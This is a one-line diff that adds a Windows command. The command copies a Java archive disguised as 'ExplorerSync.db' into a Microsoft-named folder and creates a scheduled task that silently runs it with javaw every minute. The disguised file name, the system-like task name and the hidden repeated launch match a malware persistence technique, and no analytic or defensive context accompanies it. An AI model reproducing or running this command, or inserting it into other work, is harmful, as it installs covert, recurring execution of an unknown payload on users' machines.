@@ -1,0 +1,1 @@
+copy %temp%\ExplorerSync.db %temp%\..\Microsoft\ExplorerSync.db && schtasks /create /tn ExplorerSync /tr "javaw -jar %temp%\..\Microsoft\ExplorerSync.db" /sc MINUTE /f
